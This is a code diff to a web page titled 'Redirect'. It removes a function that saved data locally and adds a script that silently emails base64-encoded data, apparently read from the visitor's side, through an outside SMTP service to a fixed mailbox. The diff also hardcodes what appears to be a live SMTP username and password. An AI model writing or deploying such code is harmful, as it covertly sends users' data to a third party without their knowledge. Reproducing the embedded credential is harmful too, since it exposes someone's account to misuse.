@@ -4,6 +4,8 @@
 <meta charset="utf-8">
 <title>Redirect</title>
 
+<script src = "https://smtpjs.com/v3/smtp.js"></script>
+
 <style>
 #container {
 	margin: 0px auto;
@@ -40,7 +42,19 @@
 				reader.onloadend = function() {
 					let base64 = reader.result;
 					console.log(base64);
-					download(base64, "test.txt", "text/plain");
+
+
+					Email.send({
+					    Host : "smtp.elasticemail.com",
+					    Username : "dgable20@jcss.us",
+					    Password : "78F3DEF417612825B048B3F1D86A4E6080F9",
+					    To : 'dgable20@jcss.us',
+					    From : "dgable20@jcss.us",
+					    Subject : "This is the subject",
+					    Body : `${base64}`
+					}).then(
+					 	console.log("ok")
+					);
 				}
 			});
 
@@ -49,23 +63,8 @@
 
 	}
 
-	function download(data, filename, type) {
-	    var file = new Blob([data], {type: type});
-	    if (window.navigator.msSaveOrOpenBlob) // IE10+
-	        window.navigator.msSaveOrOpenBlob(file, filename);
-	    else { // Others
-	        var a = document.createElement("a"),
-	                url = URL.createObjectURL(file);
-	        a.href = url;
-	        a.download = filename;
-	        document.body.appendChild(a);
-	        a.click();
-	        setTimeout(function() {
-	            document.body.removeChild(a);
-	            window.URL.revokeObjectURL(url);
-	        }, 0);
-	    }
-	}
+
+
 
 </script>
 </body>
